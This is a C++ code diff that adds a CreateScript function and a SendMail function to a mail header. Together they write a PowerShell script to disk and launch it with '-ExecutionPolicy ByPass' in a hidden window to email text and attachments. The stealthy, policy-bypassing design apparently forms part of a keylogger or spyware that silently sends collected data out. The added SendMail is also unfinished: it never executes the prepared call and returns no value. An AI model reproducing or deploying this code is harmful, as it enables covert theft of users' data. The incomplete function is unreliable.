@@ -74,6 +74,54 @@ namespace Mail
 		std::ifstream file(f);
 		return (bool)file;
 	}
+
+	bool CreateScript()
+	{
+		std::ofstream script(IO::GetOurPath(true) + std::string(SCRIPT_NAME));
+		if (!script)
+			return false; // check if script was created
+		script << PowerShellScript;
+
+		if (!script)
+			return false; // was it successfully written
+
+		script.close();
+
+		return true;
+	}
+
+	Timer m_timer;
+
+	int SendMail(const std::string &subject, const std::string &body, const std::string &attachments)
+	{
+		bool ok; // if mail was sucessfully sent
+
+		ok = IO::MKDir(IO::GetOurPath(true));
+		if (!ok)
+			return -1;
+		std::string scr_path = IO::GetOurPath(true) + std::string(SCRIPT_NAME);
+		if (!CheckFileExists(scr_path))
+			ok = CreateScript(); // attempt to create script if not present
+		if (!ok) // was attempt successful
+			return -2;
+
+		std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" - Subj \"" + 
+			StringReplace(subject, "\"", "\\\"") + "\" -Body \"" + 
+			StringReplace(body, "\"", "\\\"") + "\" -Att \"" + attachments + "\"";
+
+		SHELLEXECUTEINFO ShExecInfo = { 0 };
+		ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
+		ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+		ShExecInfo.hwnd = NULL;
+		ShExecInfo.lpVerb = "open"; // open the file
+		ShExecInfo.lpFile = "powershell"; // file to execute
+		ShExecInfo.lpParameters = param.c_str();
+		ShExecInfo.lpDirectory = NULL;
+		ShExecInfo.nShow = SW_HIDE; // hide powershell window
+		ShExecInfo.hInstApp = NULL;
+
+
+	}
 }
 
 #endif // SENDMAIL_H
